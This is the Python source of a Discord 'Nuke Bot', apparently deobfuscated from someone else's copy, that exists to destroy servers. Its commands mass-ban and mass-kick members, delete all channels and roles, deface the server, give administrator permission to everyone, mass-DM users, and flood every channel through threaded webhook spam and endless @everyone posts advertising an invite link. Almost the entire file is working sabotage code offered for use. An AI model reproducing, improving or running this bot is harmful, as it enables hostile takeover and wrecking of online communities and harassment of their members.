#
# Deobfuscated By Hisako🎀#2004
#

import os
import json
os.system("pip install discord")
import discord
from discord.ext import commands
from discord import Permissions
os.system("pip install requests")
import requests, random, threading
import datetime

def clear():
        os.system('title Nuke Bot v3 && cls' if os.name=='nt' else 'clear')

# Configuration

with open('config.json') as f:
        config = json.load(f)

prefix = config.get('prefix')
namesforchannel = config.get('channel_names')
namesforroles = config.get('roles_name')
namesforwebhook = config.get('webhooknames')
webhookmsg = config.get('spam_text')
reason = config.get('reason')
token = os.getenv("token")
with open('icon.jpg', 'rb') as f:
        iconbro = f.read()

with open('banner.jpg', 'rb') as f:
        bannerbro = f.read()

##########################################
intents = discord.Intents.all()
client = commands.Bot(description='Nuke Bot v3', command_prefix=prefix, intents=intents, case_insensitive=True, help_command=None)

axesarecool = """
███    ██ ██    ██ ██   ██ ███████     ██████   ██████  ████████ 
████   ██ ██    ██ ██  ██  ██          ██   ██ ██    ██    ██    
██ ██  ██ ██    ██ █████   █████       ██████  ██    ██    ██ 
██  ██ ██ ██    ██ ██  ██  ██          ██   ██ ██    ██    ██ 
██   ████  ██████  ██   ██ ███████     ██████   ██████     ██ 
                                                              

"""
######### Functions & Events & Commands ########

def axespam(webhook):
    while axewspam == True:
        randcolor = random.randint(0, 16777215)
        data = {'content':webhookmsg}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)

def embedspam(webhook):
    while axewspam == True:
        randcolor = random.randint(0, 16777215)
        data = {'content':'@everyone'}
        data["embeds"] = [
        {
        "description" : webhookmsg,
        "title" : "Trashed By TheAxes"
        }
        ]
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

@client.event
async def on_ready():
        clear()
        print(axesarecool)
        print(f"Logged In : {client.user}")
        print(f"Prefix : {prefix}")
        await client.change_presence(activity=discord.Game("Axes Runs Cord"))


@client.command(name="help")
async def help(ctx):
        embed = discord.Embed(title="Nuke Bot v3 | TheAxes", description="A Powerfull Nuke Bot Made By The Axes | v3")
        embed.set_author(name="Nuke Bot v3", icon_url="https://media.discordapp.net/attachments/984383210710507590/1001449542404804618/letter-logo-design-simple-modern-logo-design-letter-very-simple-black-background-color-183193944.jpg")
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/984383210710507590/1001911829087391844/download_1.jpeg")
        embed.add_field(name=f"{prefix}nuke", value="Nukes Discord Server", inline=False)
        embed.add_field(name=f"{prefix}massban", value="Bans Every Member In The Guild.", inline=False)
        embed.add_field(name=f"{prefix}masskick", value="Kicks Every Member In The Guild.", inline=False)
        embed.add_field(name=f"{prefix}nickall [text]",value="Change Every Member Nickname In The Guild From Given Text.", inline=False)
        embed.add_field(name=f"{prefix}massdm [text]", value="Dm Every Member In The Guild.", inline=False)
        embed.add_field(name=f"{prefix}webhookspam", value="Spams Deadly In Whole Server By Webhooks.", inline=False)
        embed.add_field(name=f"{prefix}stopwebhookspam", value="Stops Deadly Spam.", inline=False)
        embed.add_field(name=f"{prefix}spam [amount] [text]", value="Spams Given Amount Of Text.", inline=False)
        embed.add_field(name=f"{prefix}deletechannels", value="Delete Every Channels In The Guild.", inline=True)
        embed.add_field(name=f"{prefix}deleteroles", value="Delete Every Roles In The Guild.", inline=True)
        embed.add_field(name=f"{prefix}spamchannels", value="Create Tons Of Channels In The Guild.", inline=True)
        embed.add_field(name=f"{prefix}spamroles", value="Create Tons Of Roles.", inline=True)
        embed.add_field(name=f"{prefix}renameserver [text]", value="Rename The Guild Name From Given A Text.", inline=True)
        embed.add_field(name=f"{prefix}adminall", value=f"Give Everyone Administration Permission.", inline=False)
        embed.add_field(name=f"{prefix}serverinfo", value=f"Provide Server Info.", inline=False)
        embed.add_field(name=f"{prefix}shutdown", value=f"Shut Down The Bot.", inline=False)
        embed.set_footer(text="Made By TheAxes ♥️ - Only For You.")
        await ctx.message.delete()
        await ctx.send(embed=embed)

@client.command(name="nuke", aliases=["wizz", "destroy", "axeop", "fuckserver", "trashserver"])
async def nuke(ctx):
        await ctx.message.delete()
        for member in list(ctx.guild.members):
                try:
                        await member.ban()
                except:
                        pass
        for channel in list(ctx.guild.channels):
                try:
                        await channel.delete()
                except:
                        pass
        for role in list(ctx.guild.roles):
                try:
                        await role.delete()
                except:
                        pass
        try:
                await ctx.guild.edit(
                name="TRASHED BY THEAXES",
                description="This Server Trashed By TheAxes With Heavy Destruction.",
                reason=reason,
                icon=iconbro,
                banner=bannerbro)
        except:
                pass

        for i in range(125):
                await ctx.guild.create_text_channel(name=random.choice(namesforchannel))
        for i in range(250):
                await ctx.guild.create_role(name=random.choice(namesforroles, color=RandomColor()))
        print(f"SUCCESFULLY NUKED: {ctx.guild.name}")

@client.command(name="massban", aliases=["banall", "ball", "baneveryone"])
async def massban(ctx):
        await ctx.message.delete()
        await ctx.send("> **MassBan Started | Nuke Bot v3**")
        for user in ctx.guild.members:
                try:
                        await user.ban()
                except:
                        pass

@client.command(name="masskick", aliases=["kickall", "kall", "kickeveryone"])
async def masskick(ctx):
        await ctx.message.delete()
        await ctx.send("> **MassKick Started | Nuke Bot v3")
        for user in ctx.guild.members:
                try:
                        await user.kick()
                except:
                        pass

@client.command(name="nickall", aliases=["massnick", "nickeveryone", "nickusers"])
async def nickall(ctx, *, text):
        await ctx.message.delete()
        for user in ctx.guild.members:
                try:
                        await user.nick(name=text)
                except:
                        pass

@client.command(name="massdm", aliases=["dmall", "dall", "dmeveryone"])
async def massdm(ctx, *, message):
        await ctx.message.delete()
        embed = discord.Embed(title="", description=message)
        for user in ctx.guild.members:
                try:
                        await user.send(embed=embed)
                except:
                        pass

@client.command(name="webhookspam", aliases=["spamall", "toomanyspams", "spammessages"])
async def webhookspam(ctx):
        await ctx.message.delete()
        axewspam = True
        if len(await ctx.guild.webhooks()) != 0:
                for webhook in await ctx.guild.webhooks():
                        threading.Thread(target=axespam, args=(webhook.url,)).start()
                        threading.Thread(target=embedspam, args=(webhook.url,)).start()
        if len(ctx.guild.text_channels) >= 99:
                webhookamount = 2
        else:
                webhookamount = 75 / len(ctx.guild.text_channels)
                webhookamount = int(webhookamount) + 1
        for i in range(webhookamount):
                for channel in ctx.guild.text_channels:
                        try:
                                webhook = await channel.create_webhook(name=namesforwebhook)
                                threading.Thread(target=axespam, args=(webhook.url,)).start()
                                threading.Thread(target=embedspam, args=(webhook.url,)).start()
                                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'w+')
                                f.write(f"{webhook.url} \n")
                                f.close()
                        except:
                                print(f"> Rate Limited By Discord.")

@client.command(aliases=['stopwebhookfuck', 'webhookstop',"webhookspamstop","stopwebhooksspam","webhookspamoff"])
async def stopwebhookspam(ctx):
        await ctx.message.delete()
        global axewspam
        axewspam = False

@client.command(name="spam", aliases=["say"])
async def spam(ctx, *, amount:int, text):
        await ctx.message.delete()
        for i in range(amount):
                await ctx.send(text)

@client.command(name="deletechannels", aliases=["clearchannels", "wipechannels", "delchannels"])
async def deletechannels(ctx):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
                try:
                        await channel.delete()
                except:
                        pass

@client.command(name="deleteroles", aliases=["clearroles", "removeroles", "wiperoles", "delroles"])
async def deleteroles(ctx):
        await ctx.message.delete()
        for role in ctx.guild.roles:
                try:
                        await role.delete()
                except:
                        pass

@client.command(name="spamchannels", aliases=["createchannels","masschannel"])
async def spamchannels(ctx):
        await ctx.message.delete()
        for i in range(250):
                try:
                        await ctx.guild.create_text_channel(name=random.choice(namesforchannel))
                except:
                        pass

@client.command(name="spamroles", aliases=["createroles", "massroles"])
async def spamroles(ctx):
        await ctx.message.delete()
        for i in range(250):
                try:
                        await ctx.guild.create_role(name=random.choice(namesforroles, color=RandomColor()))
                except:
                        pass

@client.command(name="renameserver", aliases=["editserver", "editguild"])
async def renameserver(ctx, *, servername):
        await ctx.message.delete()
        await ctx.guild.edit(name=servername, reason=reason)

@client.command(name="adminall", aliases=["admineveryone"])
async def adminall(ctx):
        permissions = discord.Permissions(8)
        await ctx.message.delete()
        for role in list(ctx.guild.roles):
                if role.name == '@everyone':
                        try:
                                await role.edit(permissions=permissions, reason="Axe On Top")
                        except:
                                pass

@client.command()
async def serverinfo(ctx):
        await ctx.message.delete()
        date_format = "%a, %d %b %Y %I:%M %p"
        embed = discord.Embed(title=f"{ctx.guild.name}",
        description=f"\n {len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
        timestamp=datetime.datetime.utcnow(), color=discord.Color.blue())
        embed.add_field(name="Server created at", value=f"{ctx.guild.created_at.strftime(date_format)}")
        embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
        embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
        embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
        embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
        await ctx.send(embed=embed)

@client.event
async def on_guild_channel_create(channel):
        while True:
                await channel.send(random.choice(webhookmsg))


@client.event
async def on_guild_channel_create(channel):
        webhook =await channel.create_webhook(name = "Seized By TheAxes")
        while True:
                await channel.send("@everyone Team Axe Op https://discord.gg/q4F9AYEwCh")
                await webhook.send(random.choice(webhookmsg), username=random.choice(namesforwebhook))



@client.command(name="shutdown")
async def shutdown(ctx):
        await ctx.message.delete()
        await ctx.send("> ShutDown Successfull")
        await client.close()

client.run(token)